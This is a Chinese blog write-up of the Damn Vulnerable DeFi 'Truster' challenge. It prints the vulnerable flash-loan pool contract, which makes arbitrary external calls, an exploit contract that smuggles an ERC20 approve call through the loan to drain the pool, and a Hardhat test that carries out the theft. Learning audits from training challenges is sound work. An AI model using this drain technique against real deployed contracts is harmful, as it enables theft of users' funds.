---
title: '合约审计-3'
date: 2022-12-28 14:42:15
tags:
- '区块链技术'
- '智能合约审计'
categories:
- '智能合约安全'


---

<!-- more -->

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * 贷款池合约
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor(address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external nonReentrant {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        //POC:允许任意执行其他合约数据? 
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}

```

##### EXP:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract hackTruster {
    TrusterLenderPool public pool;
    IERC20 public DVT;

    constructor(address poolAddress, address TokenAddress) {
        pool = TrusterLenderPool(poolAddress);
        DVT = IERC20(TokenAddress);
    }

    function attack(address attacker) public {
        pool.flashLoan(
            0,
            address(this),
            address(DVT),
            //因为本来这个DVTtoken就没有重写transfer和approve函数
            //,没有任何限制所有人都可调用
            abi.encodeWithSignature(
                "approve(address,uint256)",
                attacker,
                DVT.balanceOf(address(pool))
            )
        );
    }

    receive() external payable {}
}

```

##### EXP运行环境:

```js
const { ethers } = require('hardhat')
const { expect } = require('chai')
/*
  在以下条件下运行 turster 文件夹内的合约 
*/
describe('[Challenge] Truster', function () {
  let deployer, attacker

  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000')

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    ;[deployer, attacker] = await ethers.getSigners()

    const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer)
    const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer)
    //部署代币合约以及贷款池合约
    this.token = await DamnValuableToken.deploy()
    this.pool = await TrusterLenderPool.deploy(this.token.address)

    //代币合约转账1000000个DVT到贷款池
    await this.token.transfer(this.pool.address, TOKENS_IN_POOL)

    expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL)

    expect(await this.token.balanceOf(attacker.address)).to.equal('0')

    this.hackTruster = await (await ethers.getContractFactory('hackTruster', attacker)).deploy(this.pool.address, this.token.address)
  })
  //目标转移贷款池中所有token
  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    await this.hackTruster.connect(attacker).attack(attacker.address)

    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
  })

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL)
    expect(await this.token.balanceOf(this.pool.address)).to.equal('0')
  })
})

```

